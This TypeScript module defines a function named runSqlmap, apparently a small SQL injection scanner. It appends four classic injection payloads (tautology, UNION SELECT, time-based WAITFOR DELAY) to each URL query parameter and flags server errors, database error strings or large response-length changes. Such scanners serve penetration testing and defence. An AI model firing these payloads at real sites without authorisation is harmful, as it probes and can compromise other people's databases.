import { URL } from 'url';
import { resolveResponseDetails } from '../../utils/httpClient.js';

interface SqlmapOptions {
  url: string;
}

const ERROR_PATTERNS = [/sqlsyntax/i, /mysql/i, /sql server/i, /odbc/i];
const PAYLOADS = [`' OR '1'='1`, `") OR ("1"="1`, `' UNION SELECT null--`, `'; WAITFOR DELAY '0:0:5'--`];

export async function runSqlmap({ url }: SqlmapOptions): Promise<string> {
  const parsed = new URL(url);
  if ([...parsed.searchParams.keys()].length === 0) {
    return 'Target URL has no query parameters to test.';
  }
  const baseline = await resolveResponseDetails(parsed.toString(), { timeoutMs: 8000 });
  const findings: string[] = [];

  for (const param of new Set(parsed.searchParams.keys())) {
    const original = parsed.searchParams.get(param) ?? '';
    for (const payload of PAYLOADS) {
      const testUrl = new URL(parsed.toString());
      testUrl.searchParams.set(param, `${original}${payload}`);
      try {
        const res = await resolveResponseDetails(testUrl.toString(), { timeoutMs: 8000 });
        const lengthDelta = Math.abs(res.contentLength - baseline.contentLength);
        const matchedError = ERROR_PATTERNS.find((pattern) => pattern.test(res.body));
        if (res.status >= 500 || matchedError || lengthDelta > baseline.contentLength * 0.3) {
          findings.push(`Possible SQLi via "${param}" using payload "${payload}" (status ${res.status})`);
          break;
        }
      } catch {
        // ignore request errors
      }
    }
  }

  if (findings.length === 0) {
    return 'No SQL injection indicators detected.';
  }
  return findings.join('\n');
}
